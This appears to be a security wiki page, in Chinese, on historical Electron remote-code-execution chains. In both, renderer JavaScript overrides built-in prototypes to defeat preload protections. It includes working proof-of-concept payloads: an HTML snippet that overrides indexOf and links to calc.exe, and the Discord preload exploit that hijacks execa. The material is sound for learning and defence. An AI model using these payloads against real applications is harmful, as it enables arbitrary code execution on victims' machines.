# Electron contextIsolation 通过 preload 代码实现 RCE

{{#include ../../banners/hacktricks-training.md}}

这些是**历史攻击链**，其中 preload 代码与攻击者控制的 renderer 内容共享 JavaScript 内部对象或特权 API。启用 context isolation 后，preload 和页面通常处于不同的 JavaScript realm 中，因此页面中的原型覆盖不会自动影响 preload 对象。请根据具体的 Electron/应用版本和 bridge 实现验证攻击链。<sup>[[3]](#references)</sup>

## 示例 1

示例来自 [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

这段代码会使用默认浏览器打开 http(s) 链接：

![Electron contextIsolation 通过 preload 代码实现 RCE - 示例 1：这段代码会使用默认浏览器打开 http(s) 链接](<../../images/image (768).png>)

在受影响的历史应用中，类似 `file:///C:/Windows/System32/calc.exe` 的本地文件导航可能会触发操作系统启动程序的路径；`SAFE_PROTOCOLS.indexOf` 原本是为了阻止这种情况。

因此，攻击者可以通过 XSS 或任意页面导航注入以下 JS 代码：

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

由于调用 `SAFE_PROTOCOLS.indexOf` 总是返回 1337，攻击者可以绕过保护并执行 calc。最终 exploit：

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

检查原始幻灯片，看看还有哪些方式可以在不弹出权限提示的情况下执行程序。<sup>[[1]](#references)</sup>

历史 Discord 攻击链还考虑过通过 UNC 风格的 `file://127.0.0.1/electron/rce.jar` 加载作为另一种潜在的执行路径；请在确切的 Windows/Electron 版本上验证其可达性。<sup>[[2]](#references)</sup>

## 示例 2：Discord App RCE

示例来自 [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

检查 preload 脚本时，我发现 Discord 会将这个函数暴露给网页，该函数允许通过 `DiscordNative.nativeModules.requireModule('MODULE-NAME')` 调用某些允许使用的模块。\
在这里，我无法直接使用可用于 RCE 的模块，例如 _child_process_ 模块，但我**发现了一段可以通过覆盖 JavaScript 内置方法并干扰已暴露模块的执行来实现 RCE 的代码**。

以下是 PoC。我能够确认，在 devTools 中调用模块 "_discord_utils_" 定义的 **`getGPUDriverVersions` 函数**时，如果同时**覆盖 `RegExp.prototype.test` 和 `Array.prototype.join`**，**calc** 应用程序就会**弹出**。

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

`getGPUDriverVersions` 函数尝试使用 "_execa_" 库执行该程序，如下所示：

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

通常，_execa_ 会尝试执行由 `nvidiaSmiPath` 变量指定的 "_nvidia-smi.exe_"，然而，由于重写了 `RegExp.prototype.test` 和 `Array.prototype.join`，**参数被替换为 "**_**calc**_**"（在 _execa**_** 的内部处理过程中**。

具体来说，这是通过影响历史版本 `cross-spawn` 解析器中的命令解析和参数处理路径来替换参数的。<sup>[[4]](#references)</sup>

## References

- [1] [Electron：滥用缺乏上下文隔离 - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [Discord 桌面应用 RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — 上下文隔离](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn` 解析器修订版及该利用链使用的确切路径（第 36–55 行）](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
